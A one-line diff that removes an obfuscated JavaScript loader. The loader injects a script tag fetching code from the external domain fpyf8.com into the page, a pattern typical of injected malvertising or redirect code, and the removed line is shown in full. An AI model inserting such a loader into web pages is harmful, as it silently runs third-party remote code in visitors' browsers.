@@ -1,1 +1,0 @@
-(function(d,z,s){s.src="//"+d+"/401/"+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})(\"fpyf8.com\",148281,document.createElement(\"script\")) 
